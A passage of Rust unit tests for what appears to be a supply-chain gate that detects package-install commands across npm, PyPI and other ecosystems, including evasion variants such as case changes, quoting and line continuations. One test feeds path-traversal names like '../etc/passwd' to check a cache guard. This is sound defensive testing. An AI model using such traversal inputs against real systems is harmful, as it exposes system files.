        let v = detect_installs("bun.cmd add left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn bun_case_insensitive_detected() {
        let v = detect_installs("Bun Install left-pad");
        assert_eq!(v.len(), 1, "case-insensitive head + verb must classify");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn bun_quoted_head_detected() {
        let v = detect_installs("'bun' install left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn bun_line_continuation_detected() {
        let v = detect_installs("bun add \\\n  left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    // ── PDM (Python → PyPI) ──
    #[test]
    fn detect_pdm_add() {
        let v = detect_installs("pdm add httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn pdm_install_bare_lockfile_detected() {
        let v = detect_installs("pdm install");
        assert_eq!(v.len(), 1, "pdm install must surface as bare lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn pdm_sync_bare_lockfile_detected() {
        let v = detect_installs("pdm sync");
        assert_eq!(v.len(), 1, "pdm sync must surface as bare lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn pdm_abs_path_and_case_variants() {
        let v = detect_installs("/usr/local/bin/pdm add httpx");
        assert_eq!(v.len(), 1);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());

        let v = detect_installs("PDM ADD httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn pdm_windows_quoted_and_line_continuation_variants() {
        for cmd in [
            "pdm.exe add httpx",
            "'pdm' add httpx",
            "pdm add \\\n  httpx",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "pdm variant must detect: {cmd:?}");
            assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
            assert!(v[0].unvettable.is_some());
            assert!(v[0].packages.is_empty());
        }
    }

    // ── Pipenv (Python → PyPI) — dual install verb ──
    #[test]
    fn detect_pipenv_install_named() {
        // `pipenv install requests` is package-bearing.
        let v = detect_installs("pipenv install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn pipenv_install_bare_vs_named_both_detected() {
        // Bare = lockfile (unvettable), named = package-bearing. Both must be
        // detected, never silently skipped. This is the dual-verb contract.
        let bare = detect_installs("pipenv install");
        assert_eq!(bare.len(), 1, "bare pipenv install must surface");
        assert_eq!(bare[0].ecosystem, Ecosystem::Pypi);
        assert!(bare[0].unvettable.is_some(), "bare = lockfile = unvettable");

        let named = detect_installs("pipenv install requests");
        assert_eq!(named.len(), 1, "named pipenv install must surface");
        assert_eq!(named[0].ecosystem, Ecosystem::Pypi);
        assert!(named[0].unvettable.is_some());
        assert!(named[0].packages.is_empty());
    }

    #[test]
    fn pipenv_sync_bare_lockfile_detected() {
        let v = detect_installs("pipenv sync");
        assert_eq!(v.len(), 1, "pipenv sync must surface as bare lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn pipenv_quoted_head_and_line_continuation() {
        let v = detect_installs("'pipenv' install requests");
        assert_eq!(v.len(), 1);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());

        let v = detect_installs("pipenv install \\\n  requests");
        assert_eq!(v.len(), 1);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn pipenv_abs_path_windows_and_case_variants() {
        for cmd in [
            "/usr/local/bin/pipenv install requests",
            "pipenv.cmd install requests",
            "PIPENV INSTALL requests",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "pipenv variant must detect: {cmd:?}");
            assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
            assert!(v[0].unvettable.is_some());
            assert!(v[0].packages.is_empty());
        }
    }

    #[test]
    fn pnpm_update_named_is_local_only_unvettable() {
        let v = detect_installs("pnpm update left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn pnpm_update_bare_is_unvettable() {
        let v = detect_installs("pnpm update --latest");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_update_named_is_local_only_unvettable() {
        let v = detect_installs("poetry update httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn poetry_update_bare_is_unvettable() {
        let v = detect_installs("poetry update --dry-run");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn brew_install_is_unknown_unvettable() {
        for cmd in [
            "brew install wget",
            "/opt/homebrew/bin/brew install ripgrep",
            "BREW INSTALL jq",
            "brew install \\\n  fd",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "brew variant must detect: {cmd:?}");
            assert_eq!(v[0].ecosystem, Ecosystem::Unknown);
            assert!(v[0].unvettable.is_some());
            assert!(v[0].packages.is_empty());
        }
    }

    // ── conda / mamba (conda channels → mapped to PyPI but UNVETTABLE) ──
    #[test]
    fn conda_install_is_unvettable_not_vetted() {
        // conda packages resolve from conda channels, NOT PyPI. The install
        // must be DETECTED and surfaced as unvettable (fail closed to Ask),
        // never silently skipped and never vetted as a real PyPI package.
        let v = detect_installs("conda install numpy");
        assert_eq!(v.len(), 1, "conda install must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(
            v[0].unvettable.is_some(),
            "conda must fail closed to Ask (unvettable), not be vetted vs PyPI"
        );
        assert!(
            v[0].packages.is_empty(),
            "conda package set must be dropped so it is never queried against PyPI"
        );
    }

    #[test]
    fn conda_create_with_env_flag_is_unvettable() {
        // `conda create -n <env> <pkg>`: the `-n <env>` precedes packages.
        // Detection + Ask is the contract; package parse accuracy is moot
        // because the whole install is unvettable.
        let v = detect_installs("conda create -n myenv numpy scipy");
        assert_eq!(v.len(), 1, "conda create must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn conda_adversarial_head_variants_unvettable() {
        for cmd in [
            "conda.exe install numpy",            // Windows launcher
            "CONDA INSTALL numpy",                // case-insensitive
            "/opt/conda/bin/conda install numpy", // abs path
            "'conda' install numpy",              // quoted head
            "conda install \\\n  numpy",          // line-continuation
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "conda variant must detect: {cmd:?}");
            assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
            assert!(
                v[0].unvettable.is_some(),
                "conda variant must be unvettable: {cmd:?}"
            );
            assert!(v[0].packages.is_empty(), "no PyPI vetting for: {cmd:?}");
        }
    }

    #[test]
    fn mamba_install_is_unvettable_not_vetted() {
        let v = detect_installs("mamba install numpy");
        assert_eq!(v.len(), 1, "mamba install must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(
            v[0].unvettable.is_some(),
            "mamba must fail closed to Ask (unvettable), not be vetted vs PyPI"
        );
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn mamba_create_is_unvettable() {
        // mamba is a conda drop-in: `mamba create -n <env> <pkgs>` must be
        // detected and unvettable, exactly like `conda create`. Before the
        // MAMBA_RE `install|create` fix this bypassed the gate (silent Skip).
        let v = detect_installs("mamba create -n ds numpy");
        assert_eq!(v.len(), 1, "mamba create must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn mamba_windows_launcher_unvettable() {
        let v = detect_installs("mamba.cmd install numpy");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn mamba_abs_path_case_quoted_and_line_continuation_variants() {
        for cmd in [
            "/opt/conda/bin/mamba install numpy",
            "MAMBA INSTALL numpy",
            "'mamba' install numpy",
            "mamba install \\\n  numpy",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "mamba variant must detect: {cmd:?}");
            assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
            assert!(v[0].unvettable.is_some());
            assert!(v[0].packages.is_empty());
        }
    }

    // ─── Peer-review round 2 (BLOCKER + HIGHs from #142) ───────────────────
    //
    // Both Codex and agy peer-reviewed #142 and converged on a BLOCKER:
    // value-consuming flags (`poetry install --with dev`, `uv sync --extra dev`)
    // misclassified the value token as a package, flipping `has_package=true`
    // and causing a silent Skip on the newly-expanded detection surface.
    // agy added line-continuation and case-sensitivity issues; Codex added
    // versioned pip and case-sensitivity. All pinned here.

    #[test]
    fn poetry_install_with_value_consuming_flag_still_bare() {
        // BLOCKER: `--with <group>` consumes the next token. Before this fix,
        // `dev` was treated as a package and the install was silently dropped.
        let v = detect_installs("poetry install --with dev");
        assert_eq!(
            v.len(),
            1,
            "poetry install --with dev must still surface as bare"
        );
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_install_with_only_flag_still_bare() {
        let v = detect_installs("poetry install --only main");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_install_with_without_and_extras_flags_still_bare() {
        let v = detect_installs("poetry install --without dev --extras docs");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
    }

    #[test]
    fn uv_sync_with_extra_value_still_bare() {
        // BLOCKER mirror in PyPI/uv: `--extra dev` consumes a value.
        let v = detect_installs("uv sync --extra dev");
        assert_eq!(v.len(), 1, "uv sync --extra dev must still surface as bare");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn uv_sync_with_group_value_still_bare() {
        let v = detect_installs("uv sync --group dev --no-extra docs");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
    }

    #[test]
    fn npm_ci_with_value_consuming_flag_still_bare() {
        // npm ci never takes a positional package; treat any trailing token
        // as a flag value, never as a package.
        let v = detect_installs("npm ci --prefix /opt/build");
        assert_eq!(v.len(), 1, "npm ci is always bare");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
    }

    #[test]
    fn yarn_install_with_value_consuming_flag_still_bare() {
        let v = detect_installs("yarn install --modules-folder vendor");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
    }

    // Windows launcher case-insensitivity (Codex + agy HIGH on #142).

    #[test]
    fn windows_launcher_uppercase_npm_cmd_detected() {
        let v = detect_installs("NPM.CMD install lodash");
        assert_eq!(v.len(), 1, "NPM.CMD (all caps) must classify as npm");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn windows_launcher_mixed_case_detected() {
        let v = detect_installs("Npm.Cmd install lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn windows_launcher_full_uppercase_no_suffix_detected() {
        let v = detect_installs("NPM install lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn windows_launcher_pip_exe_uppercase_detected() {
        let v = detect_installs("PIP.EXE install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn windows_launcher_double_extension_detected() {
        // agy MEDIUM: `npm.cmd.exe` only had one suffix layer stripped.
        // Loop strip now collapses both.
        let v = detect_installs("npm.cmd.exe install lodash");
        assert_eq!(v.len(), 1, "double-extension must strip recursively");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    // Versioned pip launcher (Codex HIGH on #142).

    #[test]
    fn versioned_pip_3_12_detected() {
        let v = detect_installs("pip3.12 install requests");
        assert_eq!(v.len(), 1, "pip3.12 must classify as pip");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn versioned_pip_3_12_exe_detected() {
        let v = detect_installs("pip3.12.exe install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn versioned_pip_abs_path_detected() {
        let v = detect_installs("/usr/local/bin/pip3.11 install httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["httpx"]);
    }

    // Line continuation (agy HIGH on #142).

    #[test]
    fn line_continuation_multiline_install_caught() {
        // `\\<nl>  foo` → ` foo`. Without the preprocess, the `\r\n` guard
        // in the arg-capture truncated at the `\` and packages on the next
        // line went undetected.
        let v = detect_installs("npm install left-pad \\\n  lodash");
        assert_eq!(v.len(), 1, "line-continuation must collapse to one install");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        let pkgs: Vec<&str> = v[0].packages.iter().map(|(n, _)| n.as_str()).collect();
        assert!(pkgs.contains(&"left-pad"), "missing left-pad in {pkgs:?}");
        assert!(pkgs.contains(&"lodash"), "missing lodash in {pkgs:?}");
    }

    #[test]
    fn yarn_version_flag_not_a_bare_install() {
        // Codex LOW on #143: `yarn --version` is a diagnostic invocation;
        // the bare-yarn rule used to over-match any dash-prefixed next-token.
        let v = detect_installs("yarn --version");
        assert!(
            v.is_empty(),
            "yarn --version must NOT classify as install: {v:?}"
        );
    }

    #[test]
    fn yarn_help_flag_not_a_bare_install() {
        let v = detect_installs("yarn --help");
        assert!(v.is_empty(), "yarn --help must NOT classify as install");
    }

    #[test]
    fn yarn_short_version_not_a_bare_install() {
        let v = detect_installs("yarn -v");
        assert!(v.is_empty(), "yarn -v must NOT classify as install");
    }

    #[test]
    fn yarn_with_other_flag_still_bare_install() {
        // Sanity: a non-diagnostic flag (`--frozen-lockfile`) should still
        // be treated as a bare yarn install (this is the shorthand form
        // `yarn install --frozen-lockfile`).
        let v = detect_installs("yarn --frozen-lockfile");
        assert_eq!(v.len(), 1, "yarn --frozen-lockfile is still a bare install");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
    }

    #[test]
    fn line_continuation_legacy_mac_cr_only_caught() {
        // agy BLOCKER on #143: backslash + bare `\r` (legacy mac line ending)
        // was not collapsed by the original `\\\r?\n\s*` regex, so a
        // continuation line on a `\r`-only script bypassed detection. Now
        // covered by `\\(?:\r\n|\n|\r)\s*`.
        let v = detect_installs("npm install foo \\\r  bar");
        assert_eq!(v.len(), 1, "bare \\r continuation must collapse like \\n");
        let pkgs: Vec<&str> = v[0].packages.iter().map(|(n, _)| n.as_str()).collect();
        assert!(pkgs.contains(&"foo"), "missing foo in {pkgs:?}");
        assert!(pkgs.contains(&"bar"), "missing bar in {pkgs:?}");
    }

    #[test]
    fn line_continuation_crlf_caught() {
        let v = detect_installs("npm install foo \\\r\n  bar");
        assert_eq!(v.len(), 1);
        let pkgs: Vec<&str> = v[0].packages.iter().map(|(n, _)| n.as_str()).collect();
        assert!(pkgs.contains(&"foo"));
        assert!(pkgs.contains(&"bar"));
    }

    #[test]
    fn line_continuation_does_not_merge_distinct_commands() {
        // Real newline (no backslash) still separates two installs — the
        // preprocess only collapses `\<nl>`, not bare `<nl>`.
        let v = detect_installs("npm install x\npip install y");
        assert_eq!(v.len(), 2, "bare newline still separates installs");
    }

    #[test]
    fn uv_does_not_double_match_via_pip() {
        // `uv pip install foo` must match the UV pattern once, NOT also
        // the bare PIP pattern on the inner `pip install foo` substring.
        let v = detect_installs("uv pip install requests");
        assert_eq!(
            v.len(),
            1,
            "expected exactly one detection, got {}",
            v.len()
        );
    }

    #[test]
    fn editable_install_flagged() {
        let v = detect_installs("pip install -e .");
        assert!(v[0].has_editable);
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn dot_extras_treated_as_editable() {
        let v = detect_installs("pip install .[dev]");
        assert!(v[0].has_editable);
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn npm_scoped_pkg_with_version_preserved() {
        let (n, v) = split_name_version("@types/node@22.10.0");
        assert_eq!(n, "@types/node");
        assert_eq!(v.as_deref(), Some("22.10.0"));
        let (n, v) = split_name_version("@types/node");
        assert_eq!(n, "@types/node");
        assert_eq!(v, None);
    }

    #[test]
    fn pip_version_specifiers() {
        assert_eq!(split_name_version("requests==2.31.0").0, "requests");
        assert_eq!(
            split_name_version("requests==2.31.0").1.as_deref(),
            Some("2.31.0")
        );
        assert_eq!(split_name_version("requests>=2.0").0, "requests");
        assert_eq!(split_name_version("requests>=2.0").1, None);
        assert_eq!(split_name_version("requests~=2.0").0, "requests");
        assert_eq!(split_name_version("requests~=2.0").1, None);
    }

    #[test]
    fn override_glob_pattern() {
        assert!(matches_override("@types/node", &["@types/*".into()]));
        assert!(!matches_override("@scope/x", &["@types/*".into()]));
        assert!(matches_override("lodash", &["lodash".into()]));
    }

    #[test]
    fn detect_no_install_returns_empty() {
        assert!(detect_installs("git status").is_empty());
        assert!(detect_installs("npm test").is_empty());
        assert!(detect_installs("pip list").is_empty());
    }

    #[test]
    fn skip_flag_args() {
        let v = detect_installs("pip install -r requirements.txt foo");
        // -r and requirements.txt should both be skipped; only `foo` remains
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn url_install_is_remote_unvettable_not_local_editable() {
        let v = detect_installs("pip install https://example.com/pkg.tar.gz");
        assert!(!v[0].has_editable);
        assert!(v[0].packages.is_empty());
        assert!(v[0].unvettable.is_some());
    }

    // ─── #145: parse_package_args robustness ───────────────────────────────

    #[test]
    fn pep_508_extras_suffix_stripped() {
        let v = detect_installs("pip install celery[redis]");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].packages.len(), 1);
        assert_eq!(v[0].packages[0].0, "celery", "extras must be stripped");
        assert_eq!(v[0].packages[0].1, None);
    }

    #[test]
    fn pep_508_extras_with_exact_pin_preserved() {
        let v = detect_installs("pip install celery[redis]==5.3.0");
        assert_eq!(v[0].packages[0].0, "celery");
        assert_eq!(v[0].packages[0].1.as_deref(), Some("5.3.0"));
    }

    #[test]
    fn pep_508_multi_extras_stripped() {
        let v = detect_installs("pip install requests[socks,security]");
        assert_eq!(v[0].packages[0].0, "requests");
    }

    #[test]
    fn pep_508_extras_direct_unit() {
        assert_eq!(split_name_version("celery[redis]").0, "celery");
        assert_eq!(
            split_name_version("celery[redis]==5.3.0"),
            ("celery".to_string(), Some("5.3.0".to_string()))
        );
        assert_eq!(
            split_name_version("requests[socks,security]>=2.0").0,
            "requests"
        );
    }

    #[test]
    fn inline_hash_comment_terminates_args() {
        let v = detect_installs("pip install flask # this comment");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["flask"], "comment tokens leaked through");
    }

    #[test]
    fn inline_hash_only_terminates_when_standalone_token() {
        let v = detect_installs("pip install pkg#fragment");
        assert_eq!(v.len(), 1);
        assert!(!v[0].packages.is_empty());
    }

    #[test]
    fn pip_value_consuming_flag_platform() {
        let v = detect_installs("pip install --platform linux_x86_64 foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_python_version() {
        let v = detect_installs("pip install --python-version 3.11 foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_trusted_host() {
        let v = detect_installs("pip install --trusted-host pypi.org foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_extra_index_url() {
        let v = detect_installs("pip install --extra-index-url https://pkg.example.org/simple foo");
        let ns = names(&v[0]);
        assert!(ns.contains(&"foo"));
        assert!(!ns.iter().any(|n| n.starts_with("http")));
    }

    #[test]
    fn pip_value_consuming_flag_find_links() {
        let v = detect_installs("pip install --find-links /tmp/wheels foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_only_binary() {
        let v = detect_installs("pip install --only-binary :all: foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_no_binary() {
        let v = detect_installs("pip install --no-binary :none: foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_prefix() {
        let v = detect_installs("pip install --prefix /opt/venv foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_root() {
        let v = detect_installs("pip install --root /staging foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_upgrade_strategy() {
        let v = detect_installs("pip install --upgrade-strategy eager foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_value_consuming_flag_attached_equals_form() {
        let v = detect_installs("pip install --platform=linux_x86_64 foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pip_boolean_flag_unchanged() {
        let v = detect_installs("pip install --upgrade --user foo");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    // ─── #149: perf — O(n) dedup + O(log n) claimed-span check ────────────

    #[test]
    fn perf_dedup_collapses_many_duplicates_quickly() {
        let mut items: Vec<ParsedInstall> = (0..5_000)
            .map(|_| ParsedInstall {
                ecosystem: Ecosystem::Pypi,
                packages: vec![("requests".to_string(), Some("2.31.0".to_string()))],
                has_editable: false,
                unvettable: None,
            })
            .collect();
        let start = std::time::Instant::now();
        dedup_installs(&mut items);
        let elapsed = start.elapsed();
        assert_eq!(items.len(), 1, "all 5000 duplicates must collapse to 1");
        assert!(
            elapsed.as_millis() < 100,
            "dedup of 5000 duplicates must be sub-100ms (got {}ms) — see #149",
            elapsed.as_millis()
        );
    }

    #[test]
    fn perf_dedup_preserves_first_occurrence_order() {
        let mk = |pkg: &str| ParsedInstall {
            ecosystem: Ecosystem::Pypi,
            packages: vec![(pkg.to_string(), None)],
            has_editable: false,
            unvettable: None,
        };
        let mut items = vec![mk("a"), mk("b"), mk("a"), mk("c"), mk("b"), mk("a")];
        dedup_installs(&mut items);
        let names: Vec<&str> = items.iter().map(|i| i.packages[0].0.as_str()).collect();
        assert_eq!(names, vec!["a", "b", "c"], "first-occurrence order broken");
    }

    #[test]
    fn perf_dedup_preserves_order_independent_package_sets() {
        let mk = |pkgs: Vec<&str>| ParsedInstall {
            ecosystem: Ecosystem::Pypi,
            packages: pkgs.into_iter().map(|s| (s.to_string(), None)).collect(),
            has_editable: false,
            unvettable: None,
        };
        let mut items = vec![mk(vec!["a", "b"]), mk(vec!["b", "a"])];
        dedup_installs(&mut items);
        assert_eq!(items.len(), 1, "order-independent set must collapse");
    }

    #[test]
    fn perf_claimed_spans_handle_many_matches() {
        // Stress: many install-shaped segments in one command. Old code
        // was O(m * k) linear scan per match; new code is O(m log k) via
        // BTreeMap range-lookup. Acceptance per #149: sub-millisecond on
        // 1000+ spans. We use 200 chained segments to stay within the
        // recursion-depth + budget caps; the per-span overhead is what
        // the test guards against.
        let cmd: String = (0..200)
            .map(|i| format!("pip install pkg{}", i))
            .collect::<Vec<_>>()
            .join(" && ");
        let start = std::time::Instant::now();
        let v = detect_installs(&cmd);
        let elapsed = start.elapsed();
        assert!(!v.is_empty(), "stress payload must surface installs");
        assert!(
            elapsed.as_millis() < 250,
            "200-segment install detect must be sub-250ms (got {}ms) — see #149",
            elapsed.as_millis()
        );
    }

    #[test]
    fn mixed_editable_and_named_keeps_named_packages() {
        // `pip install -e . requests` must still surface `requests` as a
        // vettable package — the editable token is a sibling, not a free
        // pass for the whole install.
        let v = detect_installs("pip install -e . requests");
        assert_eq!(v.len(), 1);
        assert!(v[0].has_editable);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn bare_npm_install_is_unvettable() {
        // `npm install` with no package args pulls the whole dependency tree
        // from package-lock.json — the gate cannot enumerate it. It must NOT
        // be dropped as a silent Skip (#111 G1).
        let v = detect_installs("npm install");
        assert_eq!(v.len(), 1, "bare npm install should yield one install");
        assert!(v[0].packages.is_empty());
        assert!(!v[0].has_editable);
        assert!(
            v[0].unvettable.is_some(),
            "bare npm install must be flagged unvettable"
        );
    }

    #[test]
    fn bare_npm_ci_and_yarn_install_are_unvettable() {
        for cmd in ["npm ci", "pnpm install", "pnpm i", "yarn install", "yarn"] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "`{}` should yield one install", cmd);
            assert!(
                v[0].unvettable.is_some(),
                "`{}` must be flagged unvettable",
                cmd
            );
        }
    }

    #[test]
    fn stdin_redirect_does_not_look_like_package_name() {
        // `npm install < f.txt` is a bare lockfile install with stdin
        // redirected (npm ignores it). The `<` must tokenise as a shell
        // operator, not be mistaken for a package name — otherwise the
        // bare-install guard misses it (Codex/Claude re-review, #111 G1).
        for cmd in [
            "npm install < packages.txt",
            "npm ci <<EOF",
            "yarn install < f",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "`{}` should yield one install", cmd);
            assert!(
                v[0].packages.is_empty(),
                "`{}` must not name a package",
                cmd
            );
            assert!(
                v[0].unvettable.is_some(),
                "`{}` must be flagged unvettable",
                cmd
            );
        }
    }

    #[test]
    fn pip_install_requirements_file_is_unvettable() {
        // `pip install -r requirements.txt` resolves its package set from a
        // file the gate cannot vet. The whole install must be surfaced, not
        // skipped (#111 G1).
        let v = detect_installs("pip install -r requirements.txt");
        assert_eq!(v.len(), 1);
        assert!(v[0].packages.is_empty());
        assert!(!v[0].has_editable);
        assert!(
            v[0].unvettable.is_some(),
            "pip install -r must be flagged unvettable"
        );
    }

    #[test]
    fn pip_install_constraint_file_is_unvettable() {
        let v = detect_installs("pip install -c constraints.txt");
        assert_eq!(v.len(), 1);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn normal_npm_install_still_names_package() {
        // Regression guard: a real `npm install lodash` must still resolve the
        // package name and must NOT be flagged unvettable.
        let v = detect_installs("npm install lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["lodash"]);
        assert!(
            v[0].unvettable.is_none(),
            "a named install must not be flagged unvettable"
        );
    }

    #[test]
    fn requirements_install_with_named_pkg_keeps_name_and_stays_unvettable() {
        // `pip install -r req.txt foo` names `foo` (vettable) AND pulls the
        // requirements file contents (unvettable). The named package must
        // still be resolved, but the install must remain flagged unvettable
        // because the `-r` file is not enumerable — fail closed (#111 G1).
        let v = detect_installs("pip install -r requirements.txt foo");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["foo"]);
        assert!(
            v[0].unvettable.is_some(),
            "a -r requirements file alongside a named package must still flag unvettable"
        );
    }

    #[test]
    fn bare_install_not_matched_inside_named_install() {
        // `npm install lodash` must not ALSO trip the bare-lockfile regex.
        let v = detect_installs("npm install lodash");
        assert_eq!(v.len(), 1, "named install must not double-count as bare");
    }

    #[test]
    fn cache_file_rejects_traversal() {
        // Package name containing `..` must not resolve to a cache path
        // (would write to parent directory).
        assert!(cache_file(Ecosystem::Npm, "..").is_none());
        assert!(cache_file(Ecosystem::Npm, "../etc/passwd").is_none());
        assert!(cache_file(Ecosystem::Pypi, "foo..bar").is_none());
        assert!(cache_file(Ecosystem::Pypi, "").is_none());
        assert!(cache_file(Ecosystem::Npm, "foo\\bar").is_none());
        // Real names still work.
        assert!(cache_file(Ecosystem::Npm, "lodash").is_some());
        assert!(cache_file(Ecosystem::Npm, "@types/node").is_some());
    }

    #[test]
    fn lockfile_install_with_trailing_flags_is_unvettable() {
        // CRITICAL 1 (#111 G1 follow-up): a regex anchored on end-of-command
        // misses these CI-common forms. Token-stream classification must
        // catch them — trailing flags are not package names.
        for cmd in [
            "npm ci --ignore-scripts",
            "pnpm install --frozen-lockfile",
            "yarn install --immutable",
            "npm install --no-audit",
            "yarn --immutable",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "`{}` should yield one install", cmd);
            assert!(v[0].packages.is_empty(), "`{}` should name no package", cmd);
            assert!(
                v[0].unvettable.is_some(),
                "`{}` must be flagged unvettable",
                cmd
            );
        }
    }

    #[test]
    fn lockfile_install_followed_by_shell_operator_is_unvettable() {
        // A shell operator after the verb terminates the command — it is not
